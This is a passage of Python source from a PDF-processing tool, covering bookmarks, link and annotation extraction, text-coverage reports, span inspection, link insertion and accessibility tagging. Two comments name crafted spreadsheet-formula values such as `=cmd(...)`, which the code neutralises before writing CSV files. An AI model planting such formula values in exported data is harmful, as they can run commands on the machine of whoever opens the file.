            items = params.get("bookmarks") or params.get("toc") or []
            toc = []
            for it in items:
                if isinstance(it, dict):
                    toc.append([int(it.get("level", 1)), str(it.get("title", "")), int(it.get("page", 1))])
                elif isinstance(it, (list, tuple)) and len(it) >= 3:
                    toc.append([int(it[0]), str(it[1]), int(it[2])])
            doc.set_toc(toc)
            doc.save(out_pdf, garbage=3, deflate=True)
            result["changed"] = True
            result["note"] = "set %d bookmark(s)" % len(toc)

        elif op == "extract_bookmarks":
            to = params.get("to") or "output/bookmarks.json"
            data = [{"level": lvl, "title": title, "page": pg} for (lvl, title, pg) in doc.get_toc()]
            with open(os.path.join(art_dir, "bookmarks.json"), "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            result["artifacts"].append({"tmp": "bookmarks.json", "path": to, "kind": "json"})
            result["note"] = "extracted %d bookmark(s)" % len(data)

        elif op == "extract_links":
            # Pull every hyperlink out of one PDF or a whole folder into ONE combined table
            # (JSON + CSV). Clickable link annotations are authoritative — page.get_links()
            # yields URI/GoTo/Launch/Named/GoToR targets with their rect and anchor text; a
            # regex pass then adds bare URLs printed in the text that were never made
            # clickable (very common in reports/papers). Read-only: never rewrites the PDF.
            import fitz
            import csv as _csv
            to = (params.get("to") or "output/links").rstrip("/")
            to_rel = _safe_rel(to)
            if to_rel:
                to_rel = to_rel.replace("\\", "/")
            if not to_rel:
                result = {"ok": False, "error": "extract_links: `to` must be a project-relative path"}
            else:
                fmt = str(params.get("format") or "both").lower()
                want_json = fmt in ("both", "json")
                want_csv = fmt in ("both", "csv")
                raw_types = params.get("types") or ["uri"]
                if isinstance(raw_types, str):
                    raw_types = [raw_types]
                types = {str(t).strip().lower() for t in raw_types if str(t).strip()}
                want_all = "all" in types or not types
                scan_text = params.get("include_text_urls", True) is not False and (want_all or "uri" in types)
                dedupe = params.get("dedupe", False) is True
                input_names = params.get("input_names") or []
                files = input_files or [in_pdf]
                n_files = len(files)

                # LINK_* kind ints → our label. Feature-detected (PyMuPDF's constants are stable
                # but not version-pinned here); an unknown kind falls through to "other".
                kind_label = {
                    getattr(fitz, "LINK_GOTO", 1): "goto",
                    getattr(fitz, "LINK_URI", 2): "uri",
                    getattr(fitz, "LINK_LAUNCH", 3): "launch",
                    getattr(fitz, "LINK_NAMED", 4): "named",
                    getattr(fitz, "LINK_GOTOR", 5): "gotor",
                }
                url_re = re.compile(r"(?i)\b(?:https?://|ftp://|www\.)[^\s<>\"'{}|\\^`\[\]]+")
                trim = "\"'.,;:!?)]}>"

                def _keep(label):
                    return want_all or label in types

                # The already-open working doc points at the first input's temp copy; reopen each
                # input by path below, so drop the shared handle first.
                doc.close()
                rows = []
                for fi, fpath in enumerate(files):
                    name = str(input_names[fi] if fi < len(input_names) else os.path.basename(fpath)).replace("\\", "/")
                    try:
                        fdoc = fitz.open(fpath)
                    except Exception as e:  # noqa: BLE001
                        rows.append({"file": name, "page": 0, "kind": "error", "url": "", "text": str(e), "source": ""})
                        continue
                    try:
                        for pno in range(fdoc.page_count):
                            page = fdoc.load_page(pno)
                            uris_on_page = set()  # de-dupe a bare-text URL against its own annotation
                            for ln in (page.get_links() or []):
                                label = kind_label.get(ln.get("kind"), "other")
                                if label == "uri":
                                    url = str(ln.get("uri") or "").strip()
                                elif label == "goto":
                                    tgt = ln.get("page")
                                    url = ("page %d" % (int(tgt) + 1)) if isinstance(tgt, int) and tgt >= 0 else "internal"
                                elif label in ("launch", "gotor"):
                                    url = str(ln.get("file") or "").strip()
                                elif label == "named":
                                    url = str(ln.get("name") or "").strip()
                                else:
                                    url = ""
                                if not url or not _keep(label):
                                    continue
                                text = ""
                                try:
                                    rect = ln.get("from")
                                    if rect is not None:
                                        text = " ".join(page.get_textbox(rect).split())
                                except Exception:  # noqa: BLE001
                                    text = ""
                                if label == "uri":
                                    uris_on_page.add(url)
                                rows.append({"file": name, "page": pno + 1, "kind": label,
                                             "url": url, "text": text, "source": "annotation"})
                            if scan_text:
                                try:
                                    page_text = page.get_text("text") or ""
                                except Exception:  # noqa: BLE001
                                    page_text = ""
                                for m in url_re.finditer(page_text):
                                    u = m.group(0).rstrip(trim)
                                    if not u or u in uris_on_page:
                                        continue
                                    uris_on_page.add(u)
                                    rows.append({"file": name, "page": pno + 1, "kind": "uri",
                                                 "url": u, "text": "", "source": "text"})
                    finally:
                        fdoc.close()
                    try:
                        sys.stderr.write(json.dumps({"progress": {"op": op, "chunk": fi + 1, "of": n_files}}) + "\n")
                        sys.stderr.flush()
                    except Exception:  # noqa: BLE001
                        pass

                if dedupe:
                    uniq = {}
                    for r in rows:
                        key = (r.get("file", ""), r.get("kind", ""), r.get("url", ""))
                        if key not in uniq:
                            uniq[key] = r
                    rows = list(uniq.values())

                rows.sort(key=lambda r: (r.get("file", ""), int(r.get("page", 0) or 0), r.get("url", "")))

                if want_json:
                    with open(os.path.join(art_dir, "links.json"), "w", encoding="utf-8") as jf:
                        json.dump(rows, jf, indent=2, ensure_ascii=False)
                    result["artifacts"].append({"tmp": "links.json", "path": "%s/links.json" % to_rel, "kind": "json"})
                if want_csv:
                    cols = ["file", "page", "kind", "url", "text", "source"]
                    with open(os.path.join(art_dir, "links.csv"), "w", encoding="utf-8", newline="") as cf:
                        w = _csv.writer(cf)
                        w.writerow(cols)
                        for r in rows:
                            # _csv_safe: the anchor text / URL came from the PDF — never let a
                            # crafted value like `=HYPERLINK(...)` execute when the CSV is opened.
                            w.writerow([_csv_safe(r.get(c, "")) for c in cols])
                    result["artifacts"].append({"tmp": "links.csv", "path": "%s/links.csv" % to_rel, "kind": "csv"})

                n_uri = sum(1 for r in rows if r.get("kind") == "uri")
                n_err = sum(1 for r in rows if r.get("kind") == "error")
                result["changed"] = False
                result["note"] = ("found %d link(s) (%d URL%s) across %d file(s) → %s/%s"
                                  % (len(rows) - n_err, n_uri, "" if n_uri == 1 else "s", n_files, to_rel,
                                     (" · %d file(s) failed to open" % n_err) if n_err else ""))

        elif op == "extract_annotations":
            # Pull every markup/comment annotation out of one PDF or a whole folder into ONE
            # combined table (JSON + CSV): sticky notes, highlights, underlines, strikeouts,
            # free text, shapes, ink, stamps — with author, contents, the text a markup covers,
            # color, rect and dates. Read-only. (Links → extract_links; form fields → extract_fields.)
            import fitz
            import csv as _csv
            to = (params.get("to") or "output/annotations").rstrip("/")
            to_rel = _safe_rel(to)
            if to_rel:
                to_rel = to_rel.replace("\\", "/")
            if not to_rel:
                result = {"ok": False, "error": "extract_annotations: `to` must be a project-relative path"}
            else:
                fmt = str(params.get("format") or "both").lower()
                want_json = fmt in ("both", "json")
                want_csv = fmt in ("both", "csv")
                raw_types = params.get("types") or ["all"]
                if isinstance(raw_types, str):
                    raw_types = [raw_types]
                types = {str(t).strip().lower() for t in raw_types if str(t).strip()}
                want_all = "all" in types or not types
                include_text = params.get("include_text", True) is not False
                input_names = params.get("input_names") or []
                files = input_files or [in_pdf]
                n_files = len(files)

                # Friendly category filters so `types: [markup]` etc. work as well as exact types.
                cat = {
                    "text": {"text", "freetext"},
                    "markup": {"highlight", "underline", "strikeout", "squiggly"},
                    "shape": {"square", "circle", "line", "polygon", "polyline", "ink"},
                    "stamp": {"stamp"},
                }
                markup = cat["markup"]

                def _keep(label):
                    if want_all or label in types:
                        return True
                    return any(c in cat and label in cat[c] for c in types)

                def _hex(color):
                    try:
                        if not color:
                            return ""
                        return "#" + "".join("%02x" % max(0, min(255, int(round(c * 255)))) for c in list(color)[:3])
                    except Exception:  # noqa: BLE001
                        return ""

                def _date(s):
                    # PDF date "D:YYYYMMDDHHmmSS...” → "YYYY-MM-DD HH:MM"; leave as-is on parse fail.
                    s = str(s or "")
                    if s.startswith("D:") and len(s) >= 10:
                        b = s[2:]
                        try:
                            out = "%s-%s-%s" % (b[0:4], b[4:6], b[6:8])
                            if len(b) >= 12:
                                out += " %s:%s" % (b[8:10], b[10:12])
                            return out
                        except Exception:  # noqa: BLE001
                            return s
                    return s

                # The already-open working doc points at the first input's temp copy; reopen each
                # input by path below, so drop the shared handle first.
                doc.close()
                rows = []
                for fi, fpath in enumerate(files):
                    name = str(input_names[fi] if fi < len(input_names) else os.path.basename(fpath)).replace("\\", "/")
                    try:
                        fdoc = fitz.open(fpath)
                    except Exception as e:  # noqa: BLE001
                        rows.append({"file": name, "page": 0, "type": "error", "author": "",
                                     "content": str(e), "text": "", "color": "", "rect": "",
                                     "created": "", "modified": ""})
                        continue
                    try:
                        for pno in range(fdoc.page_count):
                            page = fdoc.load_page(pno)
                            for annot in (page.annots() or []):
                                try:
                                    label = (annot.type[1] if annot.type and len(annot.type) > 1 else "").lower()
                                except Exception:  # noqa: BLE001
                                    label = ""
                                # Links and form fields have their own ops; a popup is just the
                                # note window of another annotation, not content of its own.
                                if label in ("link", "popup", "widget"):
                                    continue
                                if not _keep(label):
                                    continue
                                info = annot.info or {}
                                rect = annot.rect
                                under = ""
                                if include_text and label in markup:
                                    try:
                                        under = " ".join(page.get_textbox(rect).split())
                                    except Exception:  # noqa: BLE001
                                        under = ""
                                try:
                                    stroke = (annot.colors or {}).get("stroke")
                                except Exception:  # noqa: BLE001
                                    stroke = None
                                rows.append({
                                    "file": name, "page": pno + 1, "type": label or "annotation",
                                    "author": str(info.get("title") or "").strip(),
                                    "content": str(info.get("content") or "").strip(),
                                    "text": under, "color": _hex(stroke),
                                    "rect": "[%.0f, %.0f, %.0f, %.0f]" % (rect.x0, rect.y0, rect.x1, rect.y1),
                                    "created": _date(info.get("creationDate")),
                                    "modified": _date(info.get("modDate")),
                                })
                    finally:
                        fdoc.close()
                    try:
                        sys.stderr.write(json.dumps({"progress": {"op": op, "chunk": fi + 1, "of": n_files}}) + "\n")
                        sys.stderr.flush()
                    except Exception:  # noqa: BLE001
                        pass

                rows.sort(key=lambda r: (r.get("file", ""), int(r.get("page", 0) or 0)))

                if want_json:
                    with open(os.path.join(art_dir, "annotations.json"), "w", encoding="utf-8") as jf:
                        json.dump(rows, jf, indent=2, ensure_ascii=False)
                    result["artifacts"].append({"tmp": "annotations.json", "path": "%s/annotations.json" % to_rel, "kind": "json"})
                if want_csv:
                    cols = ["file", "page", "type", "author", "content", "text", "color", "rect", "created", "modified"]
                    with open(os.path.join(art_dir, "annotations.csv"), "w", encoding="utf-8", newline="") as cf:
                        w = _csv.writer(cf)
                        w.writerow(cols)
                        for r in rows:
                            # _csv_safe: annotation text came from the PDF — never let a crafted
                            # value like `=cmd(...)` execute when the CSV is opened in a spreadsheet.
                            w.writerow([_csv_safe(r.get(c, "")) for c in cols])
                    result["artifacts"].append({"tmp": "annotations.csv", "path": "%s/annotations.csv" % to_rel, "kind": "csv"})

                n_err = sum(1 for r in rows if r.get("type") == "error")
                result["changed"] = False
                result["note"] = ("found %d annotation(s) across %d file(s) → %s%s"
                                  % (len(rows) - n_err, n_files, to_rel,
                                     (" · %d file(s) failed to open" % n_err) if n_err else ""))

        elif op == "_facts":
            # Content-level facts for `when:` guards (has_text / has_images). Read-only,
            # returned inline in the result (not as artifacts). Invoked by the executor,
            # not a user-authored op.
            facts = {}
            try:
                cov = _text_coverage(doc)
                facts["has_text"] = bool((cov.get("summary") or {}).get("pages_with_text", 0) > 0)
            except Exception:  # noqa: BLE001
                facts["has_text"] = False
            has_images = False
            try:
                for pno in range(doc.page_count):
                    if doc.load_page(pno).get_images(full=True):
                        has_images = True
                        break
            except Exception:  # noqa: BLE001
                has_images = False
            facts["has_images"] = has_images
            result["changed"] = False
            result["facts"] = facts
            result["note"] = "inspected content facts"

        elif op == "pdf_info":
            to = params.get("to") or "output/info.json"
            meta = doc.metadata or {}
            pages = []
            fonts = set()
            images = 0
            widgets = 0
            annots = 0
            for pno in range(doc.page_count):
                page = doc.load_page(pno)
                r = page.rect
                pages.append({"number": pno + 1, "width": round(r.width, 1), "height": round(r.height, 1), "rotation": page.rotation})
                try:
                    images += len(page.get_images(full=True))
                except Exception:  # noqa: BLE001
                    pass
                try:
                    widgets += sum(1 for _ in (page.widgets() or []))
                except Exception:  # noqa: BLE001
                    pass
                try:
                    annots += sum(1 for _ in (page.annots() or []))
                except Exception:  # noqa: BLE001
                    pass
                try:
                    for fnt in page.get_fonts(full=True):
                        fonts.add(fnt[3])
                except Exception:  # noqa: BLE001
                    pass
            try:
                size = os.path.getsize(in_pdf)
            except Exception:  # noqa: BLE001
                size = None
            # Additive text-coverage enrichment (P1-5) — existing keys unchanged so the
            # documented info.json contract holds; new callers get needs_ocr without a 2nd op.
            cov = _text_coverage(doc)
            _covp = {p["page"]: p for p in cov["pages"]}
            for pg in pages:
                cp = _covp.get(pg["number"])
                if cp is not None:
                    pg["chars"] = cp["chars"]
            cs = cov["summary"]
            info = {
                "page_count": doc.page_count,
                "format": meta.get("format"),
                "encrypted": bool(getattr(doc, "is_encrypted", False)),
                "file_size_bytes": size,
                "metadata": {k: meta.get(k) for k in ("title", "author", "subject", "keywords", "creator", "producer", "creationDate", "modDate")},
                "bookmarks": len(doc.get_toc()),
                "fonts": sorted(f for f in fonts if f),
                "image_placements": images,
                "form_fields": widgets,
                "annotations": annots,
                # additive text-coverage fields (full per-page detail lives in `text_report`)
                "pages_with_text": cs["pages_with_text"],
                "image_only_pages": len(cs["image_only_pages"]),
                "needs_ocr": cs["needs_ocr"],
                "repair_recommended": bool(damaged),
                "pages": pages,
            }
            with open(os.path.join(art_dir, "info.json"), "w", encoding="utf-8") as f:
                json.dump(info, f, indent=2, ensure_ascii=False)
            result["artifacts"].append({"tmp": "info.json", "path": to, "kind": "json"})
            note = "wrote info report for %d page(s)" % doc.page_count
            if cs["needs_ocr"]:
                note += " · needs OCR"
            if damaged:
                note += " · structural damage (consider a `repair` pass)"
            result["note"] = note

        elif op == "text_report":
            # P1-5: "does this PDF need OCR, and where?" — the diagnostic whose absence cost a
            # multi-hour detour. Shares _text_coverage with pdf_info / ocr / extract_markdown.
            to = params.get("to") or "output/text_report.json"
            fmt = str(params.get("format") or "json").strip().lower()
            detail = str(params.get("detail") or "full").strip().lower()
            cov = _text_coverage(
                doc, want_stats=True,
                min_image_px=params.get("min_image_px"),
                oversize_pt=params.get("oversize_pt"),
                sample=int(params.get("sample") or 0),
            )
            cs = cov["summary"]
            io_pages = cs["image_only_pages"]
            kind, action, wf = _coverage_recommendation(cs)
            report = dict(cs)
            report["recommendation"] = kind            # text-complete | mixed | image-only | blank
            report["recommended_action"] = action
            report["recommended_workflow"] = wf
            if damaged:
                report["damaged_streams"] = True
                report["repair_recommended"] = True
            if detail != "summary":
                report["pages"] = cov["pages"]         # per-page stats last (largest field)

            base, ext = os.path.splitext(to)
            if fmt in ("json", "both"):
                json_to = (base + ".json") if ext.lower() == ".md" else to
                with open(os.path.join(art_dir, "text_report.json"), "w", encoding="utf-8") as f:
                    json.dump(report, f, indent=2, ensure_ascii=False)
                result["artifacts"].append({"tmp": "text_report.json", "path": json_to, "kind": "json"})
            if fmt in ("markdown", "md", "both"):
                md_to = to if ext.lower() == ".md" else base + ".md"
                md = _text_report_markdown(report, cov["pages"] if detail != "summary" else [])
                with open(os.path.join(art_dir, "text_report.md"), "w", encoding="utf-8") as f:
                    f.write(md + "\n")
                result["artifacts"].append({"tmp": "text_report.md", "path": md_to, "kind": "text"})

            note = "text coverage: %d/%d page(s) with text (%.0f%%); %s" % (
                cs["pages_with_text"], cs.get("pages_analyzed") or cs["page_count"],
                cs["text_coverage_pct"], kind)
            if io_pages:
                note += " · %d image-only (OCR: %s)" % (len(io_pages), _compact_pages(io_pages, limit=6))
            if cs["oversized_pages"]:
                note += " · %d oversized" % len(cs["oversized_pages"])
            if cs.get("sampled"):
                note += " · sampled every %d page(s) — estimate" % cs["sampled"]["every"]
            if damaged:
                note += " · structural damage (consider a `repair` pass)"
            result["note"] = note

        elif op == "inspect_text":
            # Map the exact text spans (text + bbox + font/size/color + bold/italic) an agent
            # needs to author a precise redact/crop/stamp/annotate/add_links, or the style a
            # replace_text should match. Read-only: the report at `to` IS the output. Runs
            # per-document (batches over a glob), like text_report. PyMuPDF's dict coords are
            # TOP-LEFT origin (matches redact); bottom-left (crop/stamp/annotate) on request.
            to = params.get("to") or "output/text-spans.json"
            fmt = str(params.get("format") or "json").strip().lower()
            origin = str(params.get("origin") or "top-left").strip().lower()
            bottom_left = origin in ("bottom-left", "bottom_left", "bl")
            terms = params.get("terms")
            terms = terms if isinstance(terms, list) else ([terms] if terms else [])
            terms = [str(t) for t in terms if str(t) != ""]
            ignore_case = bool(params.get("ignore_case"))
            terms_cmp = [t.lower() for t in terms] if ignore_case else terms
            # 1-based page filter → 0-based set (None = all pages). Goes through
            # _page_set so range tokens ("5-8", "8-last") work here too.
            _want = _page_set(params.get("pages"), doc.page_count)
            page_set = {p - 1 for p in _want} if _want else None

            def _span_hex(c):
                try:
                    return "#%06x" % (int(c) & 0xFFFFFF)
                except Exception:  # noqa: BLE001
                    return ""

            pages_out = []
            total_spans = 0
            for pno in range(doc.page_count):
                if page_set is not None and pno not in page_set:
                    continue
                page = doc.load_page(pno)
                ph = float(page.rect.height)
                spans_out = []
                try:
                    blocks = page.get_text("dict").get("blocks", [])
                except Exception:  # noqa: BLE001
                    blocks = []
                for block in blocks:
                    for line in block.get("lines", []):
                        for span in line.get("spans", []):
                            text = span.get("text", "")
                            if terms_cmp:
                                hay = text.lower() if ignore_case else text
                                if not any(t in hay for t in terms_cmp):
                                    continue
                            bx = span.get("bbox", (0, 0, 0, 0))
                            og = span.get("origin", (0, 0))
                            x0, y0, x1, y1 = (float(bx[0]), float(bx[1]), float(bx[2]), float(bx[3]))
                            ox, oy = (float(og[0]), float(og[1]))
                            if bottom_left:
                                bbox = [round(x0, 2), round(ph - y1, 2), round(x1, 2), round(ph - y0, 2)]
                                orig = [round(ox, 2), round(ph - oy, 2)]
                            else:
                                bbox = [round(x0, 2), round(y0, 2), round(x1, 2), round(y1, 2)]
                                orig = [round(ox, 2), round(oy, 2)]
                            flags = int(span.get("flags", 0))
                            spans_out.append({
                                "text": text,
                                "bbox": bbox,
                                "origin": orig,
                                "font": span.get("font", ""),
                                "size": round(float(span.get("size", 0)), 2),
                                "color": _span_hex(span.get("color", 0)),
                                "bold": bool(flags & 16),
                                "italic": bool(flags & 2),
                            })
                total_spans += len(spans_out)
                pages_out.append({
                    "page": pno + 1,
                    "width": round(float(page.rect.width), 2),
                    "height": round(ph, 2),
                    "spans": spans_out,
                })

            report = {
                "coordinate_origin": "bottom-left" if bottom_left else "top-left",
                "units": "points",
                "total_pages": len(pages_out),
                "total_spans": total_spans,
            }
            if terms:
                report["terms"] = terms
            report["pages"] = pages_out

            base, ext = os.path.splitext(to)
            if fmt in ("json", "both"):
                json_to = (base + ".json") if ext.lower() == ".md" else to
                with open(os.path.join(art_dir, "inspect_text.json"), "w", encoding="utf-8") as f:
                    json.dump(report, f, indent=2, ensure_ascii=False)
                result["artifacts"].append({"tmp": "inspect_text.json", "path": json_to, "kind": "json"})
            if fmt in ("markdown", "md", "both"):
                md_to = to if ext.lower() == ".md" else base + ".md"
                md = _inspect_text_markdown(report)
                with open(os.path.join(art_dir, "inspect_text.md"), "w", encoding="utf-8") as f:
                    f.write(md + "\n")
                result["artifacts"].append({"tmp": "inspect_text.md", "path": md_to, "kind": "text"})

            note = "inspected %d text span(s) across %d page(s) (origin: %s)" % (
                total_spans, len(pages_out), report["coordinate_origin"])
            if terms:
                note += " · %d term(s)" % len(terms)
            if total_spans == 0:
                note += " — nothing matched; check `terms`/`pages`, or run `ocr` first if this is a scan (no text layer)"
            result["note"] = note

        elif op == "add_links":
            # Make URLs clickable and/or add explicit links — the inverse of extract_links.
            # `auto` (default) detects bare URLs printed in the page text and lays a URI link
            # over each on-page occurrence; `links` adds explicit links by text search
            # (url → external, goto → internal page jump). Modifies the PDF.
            import fitz
            auto = params.get("auto", True) is not False
            raw_links = params.get("links") or []
            if isinstance(raw_links, dict):
                raw_links = [raw_links]
            pages_param = params.get("pages")
            _only = _page_set(pages_param, doc.page_count)
            only = {p - 1 for p in _only} if _only else None

            url_re = re.compile(r"(?i)\b(?:https?://|ftp://|www\.)[^\s<>\"'{}|\\^`\[\]]+")
            trim = "\"'.,;:!?)]}>"

            def _norm(u):
                return ("https://" + u) if u.lower().startswith("www.") else u

            added = 0

            # Explicit links (text-search based — no coordinates to get wrong).
            for spec in raw_links:
                if not isinstance(spec, dict):
                    continue
                find = str(spec.get("find") or "")
                if not find:
                    continue
                url = spec.get("url")
                goto = spec.get("goto")
                lp = _page_set(spec.get("pages"), doc.page_count)
                lonly = {p - 1 for p in lp} if lp else None
                for pno in range(doc.page_count):
                    if lonly is not None and pno not in lonly:
                        continue
                    page = doc.load_page(pno)
                    for r in (page.search_for(find) or []):
                        if url:
                            page.insert_link({"kind": fitz.LINK_URI, "from": r, "uri": _norm(str(url))})
                            added += 1
                        elif goto is not None:
                            tgt = int(goto) - 1
                            if 0 <= tgt < doc.page_count:
                                page.insert_link({"kind": fitz.LINK_GOTO, "from": r, "page": tgt, "to": fitz.Point(0, 0)})
                                added += 1

            # Auto-linkify bare URLs printed in the text.
            if auto:
                for pno in range(doc.page_count):
                    if only is not None and pno not in only:
                        continue
                    page = doc.load_page(pno)
                    existing = set()
                    for ln in (page.get_links() or []):
                        if ln.get("kind") == fitz.LINK_URI and ln.get("uri"):
                            existing.add(str(ln["uri"]))
                    try:
                        text = page.get_text("text") or ""
                    except Exception:  # noqa: BLE001
                        text = ""
                    seen = set()
                    for m in url_re.finditer(text):
                        raw = m.group(0).rstrip(trim)
                        if not raw or raw in seen:
                            continue
                        seen.add(raw)
                        uri = _norm(raw)
                        if uri in existing:
                            continue
                        try:
                            rects = page.search_for(raw) or []
                        except Exception:  # noqa: BLE001
                            rects = []
                        for r in rects:
                            page.insert_link({"kind": fitz.LINK_URI, "from": r, "uri": uri})
                            added += 1
                        if rects:
                            existing.add(uri)

            doc.save(out_pdf, garbage=3, deflate=True)
            result["changed"] = True
            result["note"] = "added %d link(s)" % added

        elif op == "tag_pdf":
            # Auto-tag an untagged PDF: build a REAL structure tree (StructTreeRoot) with
            # MCID-linked marked content in reading order so assistive tech can navigate it.
            # Text blocks -> <H1>/<H2>/<H3>/<P> (heading level inferred from font size vs the
            # document's most-common "body" size); image XObjects -> <Figure> with /Alt. Every
            # marked-content run stays inside one BT/ET text object (a block split across text
            # objects owns several MCIDs on one element). Also sets MarkInfo/Marked and, when
            # asked, /Lang and /Title (+ DisplayDocTitle). Idempotent: skips an already-tagged
            # PDF unless force. Never fabricates a tree for a page with no text/images.
            import pikepdf
            from pikepdf import (ContentStreamInstruction as _CSI, Operator as _Op,
                                 Name as _Nm, Dictionary as _D, Array as _A, String as _S)
            from collections import Counter as _Counter

            title = str(params.get("title") or "").strip()
            lang = str(params.get("lang") or "").strip()
            alts = params.get("alt") or []
            if isinstance(alts, str):
                alts = [alts]
            force = bool(params.get("force", False))

            _ID = (1, 0, 0, 1, 0, 0)

            def _tg_mm(A, B):
                a1, b1, c1, d1, e1, f1 = A
                a2, b2, c2, d2, e2, f2 = B
                return (a1 * a2 + b1 * c2, a1 * b2 + b1 * d2, c1 * a2 + d1 * c2,
                        c1 * b2 + d1 * d2, e1 * a2 + f1 * c2 + e2, e1 * b2 + f1 * d2 + f2)

            def _tg_tr(x, y):
                return (1, 0, 0, 1, x, y)

            def _tg_f(x):
                try:
                    return float(x)
                except Exception:  # noqa: BLE001
                    return 0.0

            def _tg_events(instrs, page):
                # Recover each text run's baseline Y + effective font size, and each image
                # placement, by running a minimal text/graphics-state machine over the stream.
                try:
                    xobjs = page.Resources.XObject
                except Exception:  # noqa: BLE001
                    xobjs = None
                st = []
                ctm = _ID
                tm = tlm = _ID
                lead = 0.0
                fs = 0.0
                ev = []
                for idx, ins in enumerate(instrs):
                    try:
                        o = str(ins.operator)
                        ops = ins.operands
                    except Exception:  # noqa: BLE001
                        continue
                    if o == "q":
                        st.append(ctm)
                    elif o == "Q":
                        ctm = st.pop() if st else _ID
                    elif o == "cm" and len(ops) == 6:
                        ctm = _tg_mm(tuple(_tg_f(v) for v in ops), ctm)
                    elif o == "BT":
                        tm = tlm = _ID
                    elif o == "Tf" and len(ops) == 2:
                        fs = _tg_f(ops[1])
                    elif o == "TL" and ops:
                        lead = _tg_f(ops[0])
                    elif o == "Td" and len(ops) == 2:
                        tlm = _tg_mm(_tg_tr(_tg_f(ops[0]), _tg_f(ops[1])), tlm)
                        tm = tlm
                    elif o == "TD" and len(ops) == 2:
                        lead = -_tg_f(ops[1])
                        tlm = _tg_mm(_tg_tr(_tg_f(ops[0]), _tg_f(ops[1])), tlm)
                        tm = tlm
                    elif o == "Tm" and len(ops) == 6:
                        tm = tlm = tuple(_tg_f(v) for v in ops)
                    elif o == "T*":
                        tlm = _tg_mm(_tg_tr(0, -lead), tlm)
                        tm = tlm
                    elif o in ("Tj", "TJ", "'", '"'):
                        if o in ("'", '"'):
                            tlm = _tg_mm(_tg_tr(0, -lead), tlm)
                            tm = tlm
                        full = _tg_mm(tm, ctm)
                        ev.append((idx, full[5], abs(fs * full[3]) or abs(fs), False))
                    elif o == "Do" and ops:
                        img = False
                        try:
                            if xobjs is not None:
                                xo = xobjs.get(str(ops[0]))
                                img = xo is not None and str(xo.get("/Subtype")) == "/Image"
                        except Exception:  # noqa: BLE001
                            img = False
                        if img:
                            ev.append((idx, ctm[5], abs(ctm[3]) or 1.0, True))
                return ev

            def _tg_seg(ev, body):
                # Group runs into logical blocks (new block on a big vertical gap or a font-size
                # jump); images are their own blocks. Classify text blocks by size vs body.
                if not ev:
                    return {}, []
                bl = []
                cur = None
                py = None
                ps = None
                for (idx, y, sz, im) in ev:
                    if im:
                        if cur:
                            bl.append(cur)
                        bl.append({"idxs": [idx], "size": sz, "img": True})
                        cur = None
                        py = None
                        ps = None
                        continue
                    lh = max(sz, body) * 2.0
                    new = (cur is None or py is None or abs(y - py) > lh
                           or (ps and abs(sz - ps) > 1.5 and abs(sz - ps) > 0.1 * max(sz, ps)))
                    if new:
                        if cur:
                            bl.append(cur)
                        cur = {"idxs": [idx], "size": sz, "img": False}
                    else:
                        cur["idxs"].append(idx)
                        cur["size"] = max(cur["size"], sz)
                    py = y
                    ps = sz
                if cur:
                    bl.append(cur)

                # Heading levels by RANK, not fixed ratios: the distinct block sizes clearly
                # larger than body, sorted descending, map to H1, H2, H3 (H3 catches the rest)
                # — so a 22pt title and a 15pt section heading get different levels.
                hsizes = sorted({round(b["size"]) for b in bl
                                 if not b["img"] and b["size"] >= body * 1.15}, reverse=True)
                hrank = {s: i for i, s in enumerate(hsizes)}

                def _cl(b):
                    if b["img"]:
                        return "Figure"
                    r = hrank.get(round(b["size"]))
                    if r is None:
                        return "P"
                    return "H1" if r == 0 else "H2" if r == 1 else "H3"
                bof = {}
                kinds = []
                for bi, b in enumerate(bl):
                    kinds.append(_cl(b))
                    for i in b["idxs"]:
                        bof[i] = bi
                return bof, kinds

            def _tg_rewrite(instrs, page, body, strip):
                # Emit a new instruction list wrapping each block in /Tag <</MCID n>> BDC ... EMC.
                # A marked-content run never crosses BT/ET; a block spanning several text objects
                # owns several MCIDs (returned in bm). With strip, pre-existing marked content is
                # dropped first (force re-tag).
                ev = _tg_events(instrs, page)
                bof, kinds = _tg_seg(ev, body)
                if not kinds and not strip:
                    return instrs, None
                out = []
                m2b = []
                bm = {}
                openb = [None]

                def _close():
                    if openb[0] is not None:
                        out.append(_CSI([], _Op("EMC")))
                        openb[0] = None

                def _open(b):
                    m = len(m2b)
                    m2b.append(b)
                    bm.setdefault(b, []).append(m)
                    out.append(_CSI([_Nm("/" + kinds[b]), _D(MCID=m)], _Op("BDC")))
                    openb[0] = b
                for idx, ins in enumerate(instrs):
                    try:
                        o = str(ins.operator)
                    except Exception:  # noqa: BLE001
                        o = None
                    if strip and o in ("BDC", "BMC", "EMC", "DP", "MP"):
                        continue
                    if o == "ET":
                        _close()
                        out.append(ins)
                        continue
                    b = bof.get(idx)
                    if b is not None:
                        if openb[0] is None or openb[0] != b:
                            _close()
                            _open(b)
                        out.append(ins)
                        if kinds[b] == "Figure":
                            _close()
                        continue
                    out.append(ins)
                _close()
                if not kinds:
                    return out, None
                return out, {"kinds": kinds, "bm": bm}

            pdf = pikepdf.open(in_pdf)
            already = pdf.Root.get("/StructTreeRoot") is not None
            if already and not force:
                pdf.close()
                result["changed"] = False
                result["note"] = "already tagged — pass force: true to rebuild the tag tree"
            else:
                # Body size = the most common (mode) text-run size across the whole document.
                parsed = []
                sizes = []
                for page in pdf.pages:
                    try:
                        ins = pikepdf.parse_content_stream(page)
                    except Exception:  # noqa: BLE001
                        ins = None
                    parsed.append(ins)
                    if ins is not None:
                        sizes += [round(e[2]) for e in _tg_events(ins, page) if not e[3] and e[2] > 0]
                if sizes:
                    _c = _Counter(sizes)
                    _mx = max(_c.values())
                    body = float(min(s for s, n in _c.items() if n == _mx)) or 11.0
                else:
                    body = 11.0

                if force:
                    for _k in ("/StructTreeRoot", "/MarkInfo"):
                        if _k in pdf.Root:
                            del pdf.Root[_k]
                    for page in pdf.pages:
                        if "/StructParents" in page.obj:
                            del page.obj["/StructParents"]

                sr = pdf.make_indirect(_D(Type=_Nm.StructTreeRoot))
                de = pdf.make_indirect(_D(Type=_Nm.StructElem, S=_Nm.Document, P=sr, K=_A([])))
                sr.K = de
                nums = _A([])
                nk = 0
                counts = _Counter()
                need_alt = 0
                fig_i = 0
                for pno, page in enumerate(pdf.pages):
                    if parsed[pno] is None:
                        continue
                    ni, info = _tg_rewrite(parsed[pno], page, body, force)
                    if not info:
                        continue
                    page.Contents = pdf.make_stream(pikepdf.unparse_content_stream(ni))
                    page.Tabs = _Nm.S
                    key = nk
                    nk += 1
                    page.obj.StructParents = key
